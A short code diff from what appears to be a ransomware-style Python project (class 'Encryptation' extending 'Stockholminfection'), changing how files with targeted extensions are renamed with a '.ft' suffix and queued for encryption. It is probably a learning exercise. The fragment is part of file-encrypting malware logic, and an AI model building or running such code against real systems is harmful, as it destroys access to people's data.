@@ -39,8 +39,8 @@ class Encryptation(Stockholminfection):
         for root, directories, files in os.walk(self.path):
             for file in files:
                 if self._search_extension(file.split(".")[-1], self.extensions):
-                    os.rename(root + '/' + file, root + '/' + file.split(".")[0] + ".ft")
-                    self.files.append(root + '/' + file.split(".")[0] + ".ft")
+                    os.rename(root + '/' + file, root + '/' + file + ".ft")
+                    self.files.append(root + '/' + file + ".ft")
 
     def cipher_files(self):
         """function that cipher files"""
